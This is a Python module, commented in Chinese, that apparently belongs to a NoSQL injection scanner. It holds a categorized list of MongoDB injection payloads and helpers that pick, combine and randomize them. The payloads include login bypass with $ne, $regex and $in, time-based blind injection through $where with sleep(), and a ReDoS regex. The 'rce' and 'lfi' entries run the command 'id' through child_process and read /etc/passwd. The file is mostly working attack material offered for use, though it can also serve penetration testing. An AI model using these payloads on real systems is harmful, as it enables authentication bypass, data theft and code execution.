"""
MongoDB 注入載荷模塊
包含針對MongoDB的各種注入載荷，按類別組織
"""

import random
import string

# MongoDB 注入載荷集合
MONGODB_PAYLOADS = [
    # 基礎操作符
    {"name": "等於空字符串", "value": "", "category": "basic"},
    {"name": "不等於任意值($ne)", "value": {"$ne": ""}, "category": "basic"},
    {"name": "不等於1($ne整數)", "value": {"$ne": 1}, "category": "basic"},
    {"name": "不等於null($ne null)", "value": {"$ne": None}, "category": "basic"},
    {"name": "不等於false($ne false)", "value": {"$ne": False}, "category": "basic"},
    
    # 比較操作符
    {"name": "大於空字符串($gt)", "value": {"$gt": ""}, "category": "comparison"},
    {"name": "大於等於空字符串($gte)", "value": {"$gte": ""}, "category": "comparison"},
    {"name": "小於最大值($lt)", "value": {"$lt": "~"}, "category": "comparison"},
    {"name": "小於等於最大值($lte)", "value": {"$lte": "~"}, "category": "comparison"},
    
    # 正則表達式
    {"name": "正則表達式匹配所有($regex)", "value": {"$regex": ".*"}, "category": "regex"},
    {"name": "正則表達式匹配所有(不區分大小寫)", "value": {"$regex": ".*", "$options": "i"}, "category": "regex"},
    {"name": "正則表達式匹配開頭a", "value": {"$regex": "^a"}, "category": "regex"},
    {"name": "正則表達式匹配含有admin", "value": {"$regex": "admin"}, "category": "regex"},
    {"name": "正則表達式匹配結尾r", "value": {"$regex": "r$"}, "category": "regex"},
    {"name": "正則表達式匹配數字", "value": {"$regex": "^[0-9]+$"}, "category": "regex"},
    {"name": "正則表達式匹配字母", "value": {"$regex": "^[a-zA-Z]+$"}, "category": "regex"},
    {"name": "正則表達式匹配字母數字", "value": {"$regex": "^[a-zA-Z0-9]+$"}, "category": "regex"},
    {"name": "正則表達式匹配郵箱", "value": {"$regex": "^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$"}, "category": "regex"},
    
    # 邏輯操作符
    {"name": "或條件匹配所有($or空對象)", "value": {"$or": [{}, {"x": 1}]}, "category": "logical"},
    {"name": "或條件測試多條件", "value": {"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}, "category": "logical"},
    {"name": "與條件測試($and)", "value": {"$and": [{"$ne": ""}, {"$ne": "invalid"}]}, "category": "logical"},
    {"name": "或條件結合正則($or+$regex)", "value": {"$or": [{"$regex": "^admin"}, {"$regex": "^user"}]}, "category": "logical"},
    {"name": "邏輯非($not)", "value": {"$not": {"$eq": "invalid"}}, "category": "logical"},
    {"name": "邏輯非結合正則", "value": {"$not": {"$regex": "^invalid"}}, "category": "logical"},
    
    # 類型操作符
    {"name": "為空檢查($exists=false)", "value": {"$exists": False}, "category": "type"},
    {"name": "存在檢查($exists=true)", "value": {"$exists": True}, "category": "type"},
    {"name": "類型檢查($type)字符串", "value": {"$type": 2}, "category": "type"},
    {"name": "類型檢查($type)數字", "value": {"$type": 1}, "category": "type"},
    {"name": "類型檢查($type)布爾", "value": {"$type": 8}, "category": "type"},
    {"name": "類型檢查($type)數組", "value": {"$type": 4}, "category": "type"},
    {"name": "類型檢查($type)對象", "value": {"$type": 3}, "category": "type"},
    {"name": "類型檢查($type)null", "value": {"$type": 10}, "category": "type"},
    
    # JavaScript注入
    {"name": "JavaScript代碼($where)返回true", "value": {"$where": "return true"}, "category": "javascript"},
    {"name": "JavaScript代碼($where)檢查字段", "value": {"$where": "this.username.length > 0"}, "category": "javascript"},
    {"name": "JavaScript代碼($where)時間延遲", "value": {"$where": "sleep(2000) || true"}, "category": "javascript"},
    {"name": "JavaScript代碼($where)比較內容", "value": {"$where": "this.password == 'admin'"}, "category": "javascript"},
    {"name": "JavaScript eval執行", "value": {"$where": "eval('1+1')"}, "category": "javascript"},
    {"name": "JavaScript數組操作", "value": {"$where": "this.roles.indexOf('admin') >= 0"}, "category": "javascript"},
    
    # 常見的測試值
    {"name": "測試admin值", "value": "admin", "category": "common"},
    {"name": "測試空字符串", "value": "", "category": "common"},
    {"name": "測試1值", "value": 1, "category": "common"},
    {"name": "測試true值", "value": True, "category": "common"},
    {"name": "測試false值", "value": False, "category": "common"},
    {"name": "測試null值", "value": None, "category": "common"},
    {"name": "測試root值", "value": "root", "category": "common"},
    {"name": "測試guest值", "value": "guest", "category": "common"},
    {"name": "測試user值", "value": "user", "category": "common"},
    {"name": "測試administrator值", "value": "administrator", "category": "common"},
    
    # 參數名注入
    {"name": "字段名修改測試[param][$ne]", "value": "admin", "param_name_suffix": "[$ne]", "category": "field"},
    {"name": "字段名注入admin[$ne]", "value": "admin", "param_name_suffix": "[$ne]", "category": "field"},
    
    # 特殊類型測試
    {"name": "空數組測試", "value": [], "category": "special"},
    {"name": "空對象測試", "value": {}, "category": "special"},
    
    # 混淆技術
    {"name": "字段名混淆", "value": "ad\u006Din", "category": "obfuscation"},  # Unicode混淆
    
    # 複雜注入
    {"name": "多操作符組合", "value": {"$ne": "", "$exists": True, "$nin": ["invalid", "wrong"]}, "category": "complex"},
    {"name": "嵌套操作符", "value": {"$not": {"$eq": {"$not": {"$ne": ""}}}}, "category": "complex"},
    {"name": "雙重正則匹配", "value": {"$or": [{"$regex": ".*(?=a).*"}, {"$regex": ".*(?=m).*"}]}, "category": "complex"},
    
    # 認證繞過
    {"name": "用戶名為空密碼不為空", "value": "", "category": "auth"},
    {"name": "用戶名為空$ne", "value": {"$ne": ""}, "category": "auth"},
    {"name": "用戶名$ne密碼$ne", "value": {"$ne": None}, "category": "auth"},
    {"name": "空參數繞過", "value": "||''==''", "category": "auth"},
    
    # 盲注
    {"name": "時間延遲盲注", "value": {"$where": f"sleep({random.randint(2000, 3000)}) || this.x == 1"}, "category": "blind"},
    {"name": "正則表達式DoS", "value": {"$regex": "^(a+)+$", "$options": "i"}, "category": "blind"},
    {"name": "長整數操作延遲", "value": {"$where": f"this.x == {random.randint(10**50, 10**51)}"}, "category": "blind"},
    
    # 命令執行嘗試
    {"name": "執行系統命令", "value": {"$where": "this.a || this.constructor.constructor('return process')().exit()"}, "category": "rce"},
    {"name": "Node.js命令執行", "value": {"$where": "this.a || global.process.mainModule.require('child_process').execSync('id')"}, "category": "rce"},
    
    # 本地文件包含嘗試
    {"name": "文件讀取嘗試", "value": {"$where": "this.a || global.process.mainModule.require('fs').readFileSync('/etc/passwd')"}, "category": "lfi"}
]

def get_all_categories():
    """獲取所有可用的payload類別"""
    categories = set()
    for payload in MONGODB_PAYLOADS:
        categories.add(payload.get("category", "unknown"))
    return sorted(list(categories))

def get_payloads_by_category(category):
    """獲取指定類別的所有payload"""
    return [p for p in MONGODB_PAYLOADS if p.get("category", "unknown") == category]

def get_recommended_payloads():
    """獲取推薦的payload列表"""
    recommended_categories = ["basic", "comparison", "regex", "auth", "logical"]
    recommended = []
    
    # 從推薦類別中每個選擇一些關鍵payload
    for category in recommended_categories:
        category_payloads = get_payloads_by_category(category)
        # 從每個類別中選最多3個
        selected = category_payloads[:min(3, len(category_payloads))]
        recommended.extend(selected)
    
    # 添加一些常見的測試值
    recommended.extend([p for p in MONGODB_PAYLOADS if p["name"] in [
        "測試admin值", "測試空字符串", "測試null值"
    ]])
    
    return recommended

def get_combined_auth_payloads():
    """獲取組合的認證繞過payload"""
    return [
        {"username": {"$ne": ""}, "password": {"$ne": ""}},
        {"username": "admin", "password": {"$ne": ""}},
        {"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$ne": ""}},
        {"username": {"$regex": "^admin"}, "password": {"$ne": ""}},
        {"$where": "this.username == 'admin' && this.password.length > 0"}
    ]

def get_timed_payload(base_payload, delay_ms=2000):
    """將基本payload轉換為基於時間的盲注payload"""
    if isinstance(base_payload, dict) and "$ne" in base_payload:
        return {"$where": f"sleep({delay_ms}) || this.password != '{base_payload['$ne']}'"}
    elif isinstance(base_payload, str):
        return {"$where": f"sleep({delay_ms}) || this.password == '{base_payload}'"}
    else:
        return {"$where": f"sleep({delay_ms}) || true"}

def generate_random_payload():
    """生成隨機的payload"""
    categories = get_all_categories()
    category = random.choice(categories)
    payloads = get_payloads_by_category(category)
    return random.choice(payloads) 